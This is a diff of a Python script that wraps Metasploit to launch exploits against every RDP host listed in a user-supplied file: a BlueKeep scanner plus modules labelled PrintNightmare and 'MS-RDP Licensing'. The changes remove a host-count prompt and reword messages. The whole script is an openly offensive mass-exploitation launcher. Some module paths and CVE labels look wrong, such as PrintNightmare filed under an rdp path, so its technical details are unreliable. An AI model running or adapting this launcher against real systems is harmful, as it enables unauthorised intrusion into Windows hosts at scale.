@@ -71,28 +71,27 @@ def main():
                 run_command(f"msfconsole -q -x \"use auxiliary/scanner/rdp/cve_2019_0708_bluekeep; set RHOSTS file:{rdp_file}; run\"")
 
         elif exploit_choice == "2":
-            num_rdp_hosts = input("Enter the number of RDP hosts you want to fetch: ")
             rdp_file = input("Enter the file name containing the list of RDP hosts (e.g., rdp.txt): ")
             if not rdp_file:
                 print_color(RED, "Error: The specified file does not exist or is empty.")
             else:
-                print(f"Running Metasploit PrintNightmare exploit on the first {num_rdp_hosts} hosts from {rdp_file}...")
+                print(f"Running Metasploit PrintNightmare exploit on the provided RDP hosts from {rdp_file}...")
                 run_command(f"msfconsole -q -x \"use exploit/windows/rdp/cve_2021_34527_printnightmare; set RHOSTS file:{rdp_file}; run\"")
 
         elif exploit_choice == "3":
-            num_rdp_hosts = input("Enter the number of RDP hosts you want to fetch: ")
             rdp_file = input("Enter the file name containing the list of RDP hosts (e.g., rdp.txt): ")
             if not rdp_file:
                 print_color(RED, "Error: The specified file does not exist or is empty.")
             else:
-                print(f"Running Metasploit MS-RDP Licensing exploit on the first {num_rdp_hosts} hosts from {rdp_file}...")
+                print(f"Running Metasploit MS-RDP Licensing exploit on the provided RDP hosts from {rdp_file}...")
                 run_command(f"msfconsole -q -x \"use exploit/windows/rdp/cve_2021_36942_msrdp_licensing; set RHOSTS file:{rdp_file}; run\"")
 
         else:
-            print_color(RED, "Invalid choice. Please enter either '1', '2', or '3' corresponding to your choice.")
+            print_color(RED, "Invalid choice. Please enter a valid exploit number.")
 
     else:
         print_color(RED, "Invalid choice. Please enter either '1' or '2' corresponding to your choice.")
 
 if __name__ == "__main__":
     main()
+
